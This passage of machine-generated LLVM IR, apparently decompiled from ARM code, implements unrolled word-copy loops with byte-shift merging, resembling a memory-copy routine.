  %v0_17844 = phi i32 [ %v12_17844, %dec_label_pc_17820.dec_label_pc_17820_crit_edge ], [ %v0_1791c76, %dec_label_pc_17818 ]
  %v0_17824 = phi i32 [ %v0_17824.pre, %dec_label_pc_17820.dec_label_pc_17820_crit_edge ], [ %v4_17800, %dec_label_pc_17818 ]
  %v0_17820 = phi i32 [ %v0_17820.pre, %dec_label_pc_17820.dec_label_pc_17820_crit_edge ], [ %v2_17800, %dec_label_pc_17818 ]
  %v3_17820 = udiv i32 %v0_17820, 256
  %v1_17824 = inttoptr i32 %v0_17824 to i32*
  %v2_17824 = load i32, i32* %v1_17824, align 4
  store i32 %v2_17824, i32* %r4.global-to-local, align 4
  %v3_17824 = add i32 %v0_17824, 4
  %v4_17824 = inttoptr i32 %v3_17824 to i32*
  %v5_17824 = load i32, i32* %v4_17824, align 4
  store i32 %v5_17824, i32* %r5.global-to-local, align 4
  %v6_17824 = add i32 %v0_17824, 8
  %v7_17824 = inttoptr i32 %v6_17824 to i32*
  %v8_17824 = load i32, i32* %v7_17824, align 4
  store i32 %v8_17824, i32* %ip.global-to-local, align 4
  %v9_17824 = add i32 %v0_17824, 12
  %v10_17824 = inttoptr i32 %v9_17824 to i32*
  %v11_17824 = load i32, i32* %v10_17824, align 4
  store i32 %v11_17824, i32* %lr.global-to-local, align 4
  %v12_17824 = add i32 %v0_17824, 16
  store i32 %v12_17824, i32* %r1.global-to-local, align 4
  %v4_17828 = mul i32 %v2_17824, 16777216
  %v5_17828 = or i32 %v4_17828, %v3_17820
  store i32 %v5_17828, i32* @r3, align 4
  %v3_1782c = udiv i32 %v2_17824, 256
  %v4_17830 = mul i32 %v5_17824, 16777216
  %v5_17830 = or i32 %v4_17830, %v3_1782c
  store i32 %v5_17830, i32* %r4.global-to-local, align 4
  %v3_17834 = udiv i32 %v5_17824, 256
  %v4_17838 = mul i32 %v8_17824, 16777216
  %v5_17838 = or i32 %v4_17838, %v3_17834
  store i32 %v5_17838, i32* %r5.global-to-local, align 4
  %v3_1783c = udiv i32 %v8_17824, 256
  %v4_17840 = mul i32 %v11_17824, 16777216
  %v5_17840 = or i32 %v4_17840, %v3_1783c
  store i32 %v5_17840, i32* @ip, align 4
  %v1_17844 = inttoptr i32 %v0_17844 to i32*
  store i32 %v5_17828, i32* %v1_17844, align 4
  %v3_17844 = add i32 %v0_17844, 4
  %v4_17844 = inttoptr i32 %v3_17844 to i32*
  %v5_17844 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17844, i32* %v4_17844, align 4
  %v6_17844 = add i32 %v0_17844, 8
  %v7_17844 = inttoptr i32 %v6_17844 to i32*
  %v8_17844 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17844, i32* %v7_17844, align 4
  %v9_17844 = add i32 %v0_17844, 12
  %v10_17844 = inttoptr i32 %v9_17844 to i32*
  %v11_17844 = load i32, i32* @ip, align 4
  store i32 %v11_17844, i32* %v10_17844, align 4
  %v12_17844 = add i32 %v0_17844, 16
  store i32 %v12_17844, i32* @r0, align 4
  %v0_17848 = load i32, i32* %r2.global-to-local, align 4
  %v1_17848 = add i32 %v0_17848, -16
  store i32 %v1_17848, i32* %r2.global-to-local, align 4
  %v3_17848 = sub i32 15, %v0_17848
  %v4_17848 = and i32 %v3_17848, %v0_17848
  %v5_17848 = icmp slt i32 %v4_17848, 0
  %v6_17848 = icmp slt i32 %v1_17848, 0
  %v2_1784c = xor i1 %v6_17848, %v5_17848
  br i1 %v2_1784c, label %dec_label_pc_17850, label %dec_label_pc_17820.dec_label_pc_17820_crit_edge

dec_label_pc_17820.dec_label_pc_17820_crit_edge:  ; preds = %dec_label_pc_17820
  %v0_17820.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17824.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17820

dec_label_pc_17850:                               ; preds = %dec_label_pc_17820
  %v2_17850 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17850, i32* @r4, align 4
  %v5_17850 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17850, i32* @r5, align 4
  %v1_17854 = add i32 %v0_17848, -4
  store i32 %v1_17854, i32* %r2.global-to-local, align 4
  %v3_17854 = add i32 %v0_17848, 2147483632
  %v4_17854 = and i32 %v1_17854, %v3_17854
  %v5_17854 = icmp slt i32 %v4_17854, 0
  store i1 %v5_17854, i1* %cpsr_v.global-to-local, align 1
  %v6_17854 = icmp slt i32 %v1_17854, 0
  store i1 %v6_17854, i1* %cpsr_n.global-to-local, align 1
  %v7_17854 = icmp eq i32 %v1_17854, 0
  store i1 %v7_17854, i1* %cpsr_z.global-to-local, align 1
  %v2_17858 = xor i1 %v6_17854, %v5_17854
  br i1 %v2_17858, label %dec_label_pc_17874, label %dec_label_pc_1785c

dec_label_pc_1785c:                               ; preds = %dec_label_pc_17850, %dec_label_pc_17810, %dec_label_pc_1785c
  %v1_17868 = phi i32 [ %v4_17868, %dec_label_pc_1785c ], [ %v12_17844, %dec_label_pc_17850 ], [ %v0_1791c76, %dec_label_pc_17810 ]
  %v0_1785c = load i32, i32* %lr.global-to-local, align 4
  %v3_1785c = udiv i32 %v0_1785c, 256
  store i32 %v3_1785c, i32* %ip.global-to-local, align 4
  %v0_17860 = load i32, i32* %r1.global-to-local, align 4
  %v1_17860 = inttoptr i32 %v0_17860 to i32*
  %v2_17860 = load i32, i32* %v1_17860, align 4
  store i32 %v2_17860, i32* %lr.global-to-local, align 4
  %v4_17860 = add i32 %v0_17860, 4
  store i32 %v4_17860, i32* %r1.global-to-local, align 4
  %v4_17864 = mul i32 %v2_17860, 16777216
  %v5_17864 = or i32 %v4_17864, %v3_1785c
  store i32 %v5_17864, i32* @ip, align 4
  %v2_17868 = inttoptr i32 %v1_17868 to i32*
  store i32 %v5_17864, i32* %v2_17868, align 4
  %v3_17868 = load i32, i32* @r0, align 4
  %v4_17868 = add i32 %v3_17868, 4
  store i32 %v4_17868, i32* @r0, align 4
  %v0_1786c = load i32, i32* %r2.global-to-local, align 4
  %v1_1786c = add i32 %v0_1786c, -4
  store i32 %v1_1786c, i32* %r2.global-to-local, align 4
  %v3_1786c = sub i32 3, %v0_1786c
  %v4_1786c = and i32 %v3_1786c, %v0_1786c
  %v5_1786c = icmp slt i32 %v4_1786c, 0
  %v6_1786c = icmp slt i32 %v1_1786c, 0
  %v2_17870 = xor i1 %v6_1786c, %v5_1786c
  br i1 %v2_17870, label %dec_label_pc_17874.loopexit, label %dec_label_pc_1785c

dec_label_pc_17874.loopexit:                      ; preds = %dec_label_pc_1785c
  %v7_1786c = icmp eq i32 %v0_1786c, 4
  store i1 %v5_1786c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1786c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1786c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17874

dec_label_pc_17874:                               ; preds = %dec_label_pc_17874.loopexit, %dec_label_pc_17850
  %v0_1779c59 = phi i32 [ %v1_1786c, %dec_label_pc_17874.loopexit ], [ %v1_17854, %dec_label_pc_17850 ]
  %v0_17874 = load i32, i32* %r1.global-to-local, align 4
  %v1_17874 = add i32 %v0_17874, -3
  store i32 %v1_17874, i32* @r1, align 4
  br label %bb140

dec_label_pc_1787c:                               ; preds = %dec_label_pc_177fc
  br i1 %v2_17880, label %dec_label_pc_178c8, label %dec_label_pc_17884

dec_label_pc_17884:                               ; preds = %dec_label_pc_1787c
  store i32 %v1_1787c, i32* %r2.global-to-local, align 4
  %v3_17888 = load i32, i32* @r4, align 4
  store i32 %v3_17888, i32* %stack_var_-16, align 4
  %v6_17888 = load i32, i32* @r5, align 4
  store i32 %v6_17888, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1788c

dec_label_pc_1788c:                               ; preds = %dec_label_pc_1788c.dec_label_pc_1788c_crit_edge, %dec_label_pc_17884
  %v0_178b0 = phi i32 [ %v12_178b0, %dec_label_pc_1788c.dec_label_pc_1788c_crit_edge ], [ %v0_1791c76, %dec_label_pc_17884 ]
  %v0_17890 = phi i32 [ %v0_17890.pre, %dec_label_pc_1788c.dec_label_pc_1788c_crit_edge ], [ %v4_17800, %dec_label_pc_17884 ]
  %v0_1788c = phi i32 [ %v0_1788c.pre, %dec_label_pc_1788c.dec_label_pc_1788c_crit_edge ], [ %v2_17800, %dec_label_pc_17884 ]
  %v3_1788c = udiv i32 %v0_1788c, 65536
  %v1_17890 = inttoptr i32 %v0_17890 to i32*
  %v2_17890 = load i32, i32* %v1_17890, align 4
  store i32 %v2_17890, i32* %r4.global-to-local, align 4
  %v3_17890 = add i32 %v0_17890, 4
  %v4_17890 = inttoptr i32 %v3_17890 to i32*
  %v5_17890 = load i32, i32* %v4_17890, align 4
  store i32 %v5_17890, i32* %r5.global-to-local, align 4
  %v6_17890 = add i32 %v0_17890, 8
  %v7_17890 = inttoptr i32 %v6_17890 to i32*
  %v8_17890 = load i32, i32* %v7_17890, align 4
  store i32 %v8_17890, i32* %ip.global-to-local, align 4
  %v9_17890 = add i32 %v0_17890, 12
  %v10_17890 = inttoptr i32 %v9_17890 to i32*
  %v11_17890 = load i32, i32* %v10_17890, align 4
  store i32 %v11_17890, i32* %lr.global-to-local, align 4
  %v12_17890 = add i32 %v0_17890, 16
  store i32 %v12_17890, i32* %r1.global-to-local, align 4
  %v4_17894 = mul i32 %v2_17890, 65536
  %v5_17894 = or i32 %v4_17894, %v3_1788c
  store i32 %v5_17894, i32* @r3, align 4
  %v3_17898 = udiv i32 %v2_17890, 65536
  %v4_1789c = mul i32 %v5_17890, 65536
  %v5_1789c = or i32 %v4_1789c, %v3_17898
  store i32 %v5_1789c, i32* %r4.global-to-local, align 4
  %v3_178a0 = udiv i32 %v5_17890, 65536
  %v4_178a4 = mul i32 %v8_17890, 65536
  %v5_178a4 = or i32 %v4_178a4, %v3_178a0
  store i32 %v5_178a4, i32* %r5.global-to-local, align 4
  %v3_178a8 = udiv i32 %v8_17890, 65536
  %v4_178ac = mul i32 %v11_17890, 65536
  %v5_178ac = or i32 %v4_178ac, %v3_178a8
  store i32 %v5_178ac, i32* @ip, align 4
  %v1_178b0 = inttoptr i32 %v0_178b0 to i32*
  store i32 %v5_17894, i32* %v1_178b0, align 4
  %v3_178b0 = add i32 %v0_178b0, 4
  %v4_178b0 = inttoptr i32 %v3_178b0 to i32*
  %v5_178b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_178b0, i32* %v4_178b0, align 4
  %v6_178b0 = add i32 %v0_178b0, 8
  %v7_178b0 = inttoptr i32 %v6_178b0 to i32*
  %v8_178b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_178b0, i32* %v7_178b0, align 4
  %v9_178b0 = add i32 %v0_178b0, 12
  %v10_178b0 = inttoptr i32 %v9_178b0 to i32*
  %v11_178b0 = load i32, i32* @ip, align 4
  store i32 %v11_178b0, i32* %v10_178b0, align 4
  %v12_178b0 = add i32 %v0_178b0, 16
  store i32 %v12_178b0, i32* @r0, align 4
  %v0_178b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_178b4 = add i32 %v0_178b4, -16
  store i32 %v1_178b4, i32* %r2.global-to-local, align 4
  %v3_178b4 = sub i32 15, %v0_178b4
  %v4_178b4 = and i32 %v3_178b4, %v0_178b4
  %v5_178b4 = icmp slt i32 %v4_178b4, 0
  %v6_178b4 = icmp slt i32 %v1_178b4, 0
  %v2_178b8 = xor i1 %v6_178b4, %v5_178b4
  br i1 %v2_178b8, label %dec_label_pc_178bc, label %dec_label_pc_1788c.dec_label_pc_1788c_crit_edge

dec_label_pc_1788c.dec_label_pc_1788c_crit_edge:  ; preds = %dec_label_pc_1788c
  %v0_1788c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17890.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1788c

dec_label_pc_178bc:                               ; preds = %dec_label_pc_1788c
  %v2_178bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_178bc, i32* @r4, align 4
  %v5_178bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_178bc, i32* @r5, align 4
  %v1_178c0 = add i32 %v0_178b4, -4
  store i32 %v1_178c0, i32* %r2.global-to-local, align 4
  %v3_178c0 = add i32 %v0_178b4, 2147483632
  %v4_178c0 = and i32 %v1_178c0, %v3_178c0
  %v5_178c0 = icmp slt i32 %v4_178c0, 0
  store i1 %v5_178c0, i1* %cpsr_v.global-to-local, align 1
  %v6_178c0 = icmp slt i32 %v1_178c0, 0
  store i1 %v6_178c0, i1* %cpsr_n.global-to-local, align 1
  %v7_178c0 = icmp eq i32 %v1_178c0, 0
  store i1 %v7_178c0, i1* %cpsr_z.global-to-local, align 1
  %v2_178c4 = xor i1 %v6_178c0, %v5_178c0
  br i1 %v2_178c4, label %dec_label_pc_178e0, label %dec_label_pc_178c8

dec_label_pc_178c8:                               ; preds = %dec_label_pc_178bc, %dec_label_pc_1787c, %dec_label_pc_178c8
  %v1_178d4 = phi i32 [ %v4_178d4, %dec_label_pc_178c8 ], [ %v12_178b0, %dec_label_pc_178bc ], [ %v0_1791c76, %dec_label_pc_1787c ]
  %v0_178c8 = load i32, i32* %lr.global-to-local, align 4
  %v3_178c8 = udiv i32 %v0_178c8, 65536
  store i32 %v3_178c8, i32* %ip.global-to-local, align 4
  %v0_178cc = load i32, i32* %r1.global-to-local, align 4
  %v1_178cc = inttoptr i32 %v0_178cc to i32*
  %v2_178cc = load i32, i32* %v1_178cc, align 4
  store i32 %v2_178cc, i32* %lr.global-to-local, align 4
  %v4_178cc = add i32 %v0_178cc, 4
  store i32 %v4_178cc, i32* %r1.global-to-local, align 4
  %v4_178d0 = mul i32 %v2_178cc, 65536
  %v5_178d0 = or i32 %v4_178d0, %v3_178c8
  store i32 %v5_178d0, i32* @ip, align 4
  %v2_178d4 = inttoptr i32 %v1_178d4 to i32*
  store i32 %v5_178d0, i32* %v2_178d4, align 4
  %v3_178d4 = load i32, i32* @r0, align 4
  %v4_178d4 = add i32 %v3_178d4, 4
  store i32 %v4_178d4, i32* @r0, align 4
  %v0_178d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_178d8 = add i32 %v0_178d8, -4
  store i32 %v1_178d8, i32* %r2.global-to-local, align 4
  %v3_178d8 = sub i32 3, %v0_178d8
  %v4_178d8 = and i32 %v3_178d8, %v0_178d8
  %v5_178d8 = icmp slt i32 %v4_178d8, 0
  %v6_178d8 = icmp slt i32 %v1_178d8, 0
  %v2_178dc = xor i1 %v6_178d8, %v5_178d8
  br i1 %v2_178dc, label %dec_label_pc_178e0.loopexit, label %dec_label_pc_178c8

dec_label_pc_178e0.loopexit:                      ; preds = %dec_label_pc_178c8
  %v7_178d8 = icmp eq i32 %v0_178d8, 4
  store i1 %v5_178d8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_178d8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_178d8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_178e0

dec_label_pc_178e0:                               ; preds = %dec_label_pc_178e0.loopexit, %dec_label_pc_178bc
  %v0_1779c60 = phi i32 [ %v1_178d8, %dec_label_pc_178e0.loopexit ], [ %v1_178c0, %dec_label_pc_178bc ]
  %v0_178e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_178e0 = add i32 %v0_178e0, -2
  store i32 %v1_178e0, i32* @r1, align 4
  br label %bb140

dec_label_pc_178e8:                               ; preds = %dec_label_pc_177fc
  br i1 %v2_17880, label %dec_label_pc_17934, label %dec_label_pc_178f0

dec_label_pc_178f0:                               ; preds = %dec_label_pc_178e8
  store i32 %v1_1787c, i32* %r2.global-to-local, align 4
  %v3_178f4 = load i32, i32* @r4, align 4
  store i32 %v3_178f4, i32* %stack_var_-16, align 4
  %v6_178f4 = load i32, i32* @r5, align 4
  store i32 %v6_178f4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_178f8

dec_label_pc_178f8:                               ; preds = %dec_label_pc_178f8.dec_label_pc_178f8_crit_edge, %dec_label_pc_178f0
  %v0_1791c = phi i32 [ %v12_1791c, %dec_label_pc_178f8.dec_label_pc_178f8_crit_edge ], [ %v0_1791c76, %dec_label_pc_178f0 ]
  %v0_178fc = phi i32 [ %v0_178fc.pre, %dec_label_pc_178f8.dec_label_pc_178f8_crit_edge ], [ %v4_17800, %dec_label_pc_178f0 ]
  %v0_178f8 = phi i32 [ %v0_178f8.pre, %dec_label_pc_178f8.dec_label_pc_178f8_crit_edge ], [ %v2_17800, %dec_label_pc_178f0 ]
  %v3_178f8 = udiv i32 %v0_178f8, 16777216
  %v1_178fc = inttoptr i32 %v0_178fc to i32*
  %v2_178fc = load i32, i32* %v1_178fc, align 4
  store i32 %v2_178fc, i32* %r4.global-to-local, align 4
  %v3_178fc = add i32 %v0_178fc, 4
  %v4_178fc = inttoptr i32 %v3_178fc to i32*
  %v5_178fc = load i32, i32* %v4_178fc, align 4
  store i32 %v5_178fc, i32* %r5.global-to-local, align 4
  %v6_178fc = add i32 %v0_178fc, 8
  %v7_178fc = inttoptr i32 %v6_178fc to i32*
  %v8_178fc = load i32, i32* %v7_178fc, align 4
  store i32 %v8_178fc, i32* %ip.global-to-local, align 4
  %v9_178fc = add i32 %v0_178fc, 12
  %v10_178fc = inttoptr i32 %v9_178fc to i32*
  %v11_178fc = load i32, i32* %v10_178fc, align 4
  store i32 %v11_178fc, i32* %lr.global-to-local, align 4
  %v12_178fc = add i32 %v0_178fc, 16
  store i32 %v12_178fc, i32* %r1.global-to-local, align 4
  %v4_17900 = mul i32 %v2_178fc, 256
  %v5_17900 = or i32 %v4_17900, %v3_178f8
  store i32 %v5_17900, i32* @r3, align 4
  %v3_17904 = udiv i32 %v2_178fc, 16777216
  %v4_17908 = mul i32 %v5_178fc, 256
  %v5_17908 = or i32 %v4_17908, %v3_17904
  store i32 %v5_17908, i32* %r4.global-to-local, align 4
  %v3_1790c = udiv i32 %v5_178fc, 16777216
  %v4_17910 = mul i32 %v8_178fc, 256
  %v5_17910 = or i32 %v4_17910, %v3_1790c
  store i32 %v5_17910, i32* %r5.global-to-local, align 4
  %v3_17914 = udiv i32 %v8_178fc, 16777216
  %v4_17918 = mul i32 %v11_178fc, 256
  %v5_17918 = or i32 %v4_17918, %v3_17914
  store i32 %v5_17918, i32* @ip, align 4
  %v1_1791c = inttoptr i32 %v0_1791c to i32*
  store i32 %v5_17900, i32* %v1_1791c, align 4
  %v3_1791c = add i32 %v0_1791c, 4
  %v4_1791c = inttoptr i32 %v3_1791c to i32*
  %v5_1791c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1791c, i32* %v4_1791c, align 4
  %v6_1791c = add i32 %v0_1791c, 8
  %v7_1791c = inttoptr i32 %v6_1791c to i32*
  %v8_1791c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1791c, i32* %v7_1791c, align 4
  %v9_1791c = add i32 %v0_1791c, 12
  %v10_1791c = inttoptr i32 %v9_1791c to i32*
  %v11_1791c = load i32, i32* @ip, align 4
  store i32 %v11_1791c, i32* %v10_1791c, align 4
  %v12_1791c = add i32 %v0_1791c, 16
  store i32 %v12_1791c, i32* @r0, align 4
  %v0_17920 = load i32, i32* %r2.global-to-local, align 4
  %v1_17920 = add i32 %v0_17920, -16
  store i32 %v1_17920, i32* %r2.global-to-local, align 4
  %v3_17920 = sub i32 15, %v0_17920
  %v4_17920 = and i32 %v3_17920, %v0_17920
  %v5_17920 = icmp slt i32 %v4_17920, 0
  %v6_17920 = icmp slt i32 %v1_17920, 0
  %v2_17924 = xor i1 %v6_17920, %v5_17920
  br i1 %v2_17924, label %dec_label_pc_17928, label %dec_label_pc_178f8.dec_label_pc_178f8_crit_edge

dec_label_pc_178f8.dec_label_pc_178f8_crit_edge:  ; preds = %dec_label_pc_178f8
  %v0_178f8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_178fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_178f8

dec_label_pc_17928:                               ; preds = %dec_label_pc_178f8
  %v2_17928 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17928, i32* @r4, align 4
  %v5_17928 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17928, i32* @r5, align 4
  %v1_1792c = add i32 %v0_17920, -4
  store i32 %v1_1792c, i32* %r2.global-to-local, align 4
  %v3_1792c = add i32 %v0_17920, 2147483632
  %v4_1792c = and i32 %v1_1792c, %v3_1792c
  %v5_1792c = icmp slt i32 %v4_1792c, 0
  store i1 %v5_1792c, i1* %cpsr_v.global-to-local, align 1
  %v6_1792c = icmp slt i32 %v1_1792c, 0
  store i1 %v6_1792c, i1* %cpsr_n.global-to-local, align 1
  %v7_1792c = icmp eq i32 %v1_1792c, 0
  store i1 %v7_1792c, i1* %cpsr_z.global-to-local, align 1
  %v2_17930 = xor i1 %v6_1792c, %v5_1792c
  br i1 %v2_17930, label %dec_label_pc_1794c, label %dec_label_pc_17934

dec_label_pc_17934:                               ; preds = %dec_label_pc_17928, %dec_label_pc_178e8, %dec_label_pc_17934
  %v1_17940 = phi i32 [ %v4_17940, %dec_label_pc_17934 ], [ %v12_1791c, %dec_label_pc_17928 ], [ %v0_1791c76, %dec_label_pc_178e8 ]
  %v0_17934 = load i32, i32* %lr.global-to-local, align 4
  %v3_17934 = udiv i32 %v0_17934, 16777216
  store i32 %v3_17934, i32* %ip.global-to-local, align 4
  %v0_17938 = load i32, i32* %r1.global-to-local, align 4
  %v1_17938 = inttoptr i32 %v0_17938 to i32*
  %v2_17938 = load i32, i32* %v1_17938, align 4
  store i32 %v2_17938, i32* %lr.global-to-local, align 4
  %v4_17938 = add i32 %v0_17938, 4
  store i32 %v4_17938, i32* %r1.global-to-local, align 4
  %v4_1793c = mul i32 %v2_17938, 256
  %v5_1793c = or i32 %v4_1793c, %v3_17934
  store i32 %v5_1793c, i32* @ip, align 4
  %v2_17940 = inttoptr i32 %v1_17940 to i32*
  store i32 %v5_1793c, i32* %v2_17940, align 4
  %v3_17940 = load i32, i32* @r0, align 4
  %v4_17940 = add i32 %v3_17940, 4
  store i32 %v4_17940, i32* @r0, align 4
  %v0_17944 = load i32, i32* %r2.global-to-local, align 4
  %v1_17944 = add i32 %v0_17944, -4
  store i32 %v1_17944, i32* %r2.global-to-local, align 4
  %v3_17944 = sub i32 3, %v0_17944
  %v4_17944 = and i32 %v3_17944, %v0_17944
  %v5_17944 = icmp slt i32 %v4_17944, 0
  %v6_17944 = icmp slt i32 %v1_17944, 0
  %v2_17948 = xor i1 %v6_17944, %v5_17944
  br i1 %v2_17948, label %dec_label_pc_1794c.loopexit, label %dec_label_pc_17934

dec_label_pc_1794c.loopexit:                      ; preds = %dec_label_pc_17934
  %v7_17944 = icmp eq i32 %v0_17944, 4
  store i1 %v5_17944, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_17944, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_17944, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1794c

dec_label_pc_1794c:                               ; preds = %dec_label_pc_1794c.loopexit, %dec_label_pc_17928
  %v0_1779c61 = phi i32 [ %v1_17944, %dec_label_pc_1794c.loopexit ], [ %v1_1792c, %dec_label_pc_17928 ]
  %v0_1794c = load i32, i32* %r1.global-to-local, align 4
  %v1_1794c = add i32 %v0_1794c, -1
  store i32 %v1_1794c, i32* @r1, align 4
  br label %bb140

dec_label_pc_17954:                               ; preds = %dec_label_pc_17700
  %v1_17954 = load i32, i32* @r2, align 4
  %v2_17954 = add i32 %v1_17954, %v0_17700
  store i32 %v2_17954, i32* %r1.global-to-local, align 4
  %v2_17958 = add i32 %v1_17954, %v1_17700
  store i32 %v2_17958, i32* %r0.global-to-local, align 4
  %v2_1795c = add i32 %v1_17954, -4
  store i32 %v2_1795c, i32* %r2.global-to-local, align 4
  %v4_1795c = sub i32 3, %v1_17954
  %v5_1795c = and i32 %v4_1795c, %v1_17954
  %v6_1795c = icmp slt i32 %v5_1795c, 0
  store i1 %v6_1795c, i1* %cpsr_v.global-to-local, align 1
  %v7_1795c = icmp slt i32 %v2_1795c, 0
  store i1 %v7_1795c, i1* %cpsr_n.global-to-local, align 1
  %v8_1795c = icmp eq i32 %v1_17954, 4
  store i1 %v8_1795c, i1* %cpsr_z.global-to-local, align 1
  %v5_17960 = icmp slt i32 %v1_17954, 4
  br i1 %v5_17960, label %bb150, label %dec_label_pc_17964

dec_label_pc_17964:                               ; preds = %dec_label_pc_17954
  %v1_17964 = urem i32 %v2_17958, 4
  store i32 %v1_17964, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17964 = icmp eq i32 %v1_17964, 0
  store i1 %v2_17964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17964, label %dec_label_pc_1796c, label %dec_label_pc_17a0c

dec_label_pc_1796c:                               ; preds = %dec_label_pc_17964
  %v1_1796c = urem i32 %v2_17954, 4
  store i32 %v1_1796c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1796c = icmp eq i32 %v1_1796c, 0
  store i1 %v2_1796c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1796c, label %dec_label_pc_17974, label %dec_label_pc_17a38

dec_label_pc_17974:                               ; preds = %dec_label_pc_1796c, %dec_label_pc_17a30
  %v0_1798c37 = phi i32 [ %v2_17958, %dec_label_pc_1796c ], [ %v0_17a8020, %dec_label_pc_17a30 ]
  %v0_1798836 = phi i32 [ %v2_17954, %dec_label_pc_1796c ], [ %v0_17a30, %dec_label_pc_17a30 ]
  %v0_17974 = phi i32 [ %v2_1795c, %dec_label_pc_1796c ], [ %v2_17a28, %dec_label_pc_17a30 ]
  %v2_17974 = add i32 %v0_17974, -8
  store i32 %v2_17974, i32* %r2.global-to-local, align 4
  %v4_17974 = sub i32 7, %v0_17974
  %v5_17974 = and i32 %v4_17974, %v0_17974
  %v6_17974 = icmp slt i32 %v5_17974, 0
  store i1 %v6_17974, i1* %cpsr_v.global-to-local, align 1
  %v7_17974 = icmp slt i32 %v2_17974, 0
  store i1 %v7_17974, i1* %cpsr_n.global-to-local, align 1
  %v8_17974 = icmp eq i32 %v0_17974, 8
  store i1 %v8_17974, i1* %cpsr_z.global-to-local, align 1
  %v5_17978 = icmp slt i32 %v0_17974, 8
  br i1 %v5_17978, label %dec_label_pc_179c4, label %dec_label_pc_1797c

dec_label_pc_1797c:                               ; preds = %dec_label_pc_17974
  %v3_1797c = load i32, i32* @r4, align 4
  %v5_1797c = inttoptr i32 %v3_1797c to i8*
  store i8* %v5_1797c, i8** %stack_var_-8, align 4
  %v8_1797c = load i32, i32* @lr, align 4
  %v2_17980 = add i32 %v0_17974, -28
  store i32 %v2_17980, i32* %r2.global-to-local, align 4
  %v4_17980 = sub i32 27, %v0_17974
  %v5_17980 = and i32 %v4_17980, %v2_17974
  %v6_17980 = icmp slt i32 %v5_17980, 0
  store i1 %v6_17980, i1* %cpsr_v.global-to-local, align 1
  %v7_17980 = icmp slt i32 %v2_17980, 0
  store i1 %v7_17980, i1* %cpsr_n.global-to-local, align 1
  %v8_17980 = icmp eq i32 %v2_17974, 20
  store i1 %v8_17980, i1* %cpsr_z.global-to-local, align 1
  %v5_17984 = icmp slt i32 %v2_17974, 20
  br i1 %v5_17984, label %dec_label_pc_179a0, label %dec_label_pc_17988

dec_label_pc_17988:                               ; preds = %dec_label_pc_1797c, %dec_label_pc_17988.dec_label_pc_17988_crit_edge
  %v0_1798c = phi i32 [ %v1_17994, %dec_label_pc_17988.dec_label_pc_17988_crit_edge ], [ %v0_1798c37, %dec_label_pc_1797c ]
  %v0_17988 = phi i32 [ %v0_17988.pre, %dec_label_pc_17988.dec_label_pc_17988_crit_edge ], [ %v0_1798836, %dec_label_pc_1797c ]
  %v1_17988 = add i32 %v0_17988, -4
  %v2_17988 = inttoptr i32 %v1_17988 to i32*
  %v3_17988 = load i32, i32* %v2_17988, align 4
  %v4_17988 = add i32 %v0_17988, -8
  %v5_17988 = inttoptr i32 %v4_17988 to i32*
  %v6_17988 = load i32, i32* %v5_17988, align 4
  store i32 %v6_17988, i32* %r4.global-to-local, align 4
  %v7_17988 = add i32 %v0_17988, -12
  %v8_17988 = inttoptr i32 %v7_17988 to i32*
  %v9_17988 = load i32, i32* %v8_17988, align 4
  store i32 %v9_17988, i32* %ip.global-to-local, align 4
  %v10_17988 = add i32 %v0_17988, -16
  %v11_17988 = inttoptr i32 %v10_17988 to i32*
  %v12_17988 = load i32, i32* %v11_17988, align 4
  store i32 %v12_17988, i32* %lr.global-to-local, align 4
  store i32 %v10_17988, i32* %r1.global-to-local, align 4
  %v1_1798c = add i32 %v0_1798c, -16
  %v2_1798c = inttoptr i32 %v1_1798c to i32*
  store i32 %v3_17988, i32* %v2_1798c, align 4
  %v4_1798c = add i32 %v0_1798c, -12
  %v5_1798c = inttoptr i32 %v4_1798c to i32*
  %v6_1798c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1798c, i32* %v5_1798c, align 4
  %v7_1798c = add i32 %v0_1798c, -8
  %v8_1798c = inttoptr i32 %v7_1798c to i32*
  %v9_1798c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1798c, i32* %v8_1798c, align 4
  %v10_1798c = add i32 %v0_1798c, -4
  %v11_1798c = inttoptr i32 %v10_1798c to i32*
  %v12_1798c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1798c, i32* %v11_1798c, align 4
  store i32 %v1_1798c, i32* %r0.global-to-local, align 4
  %v0_17990 = load i32, i32* %r1.global-to-local, align 4
  %v1_17990 = add i32 %v0_17990, -4
  %v2_17990 = inttoptr i32 %v1_17990 to i32*
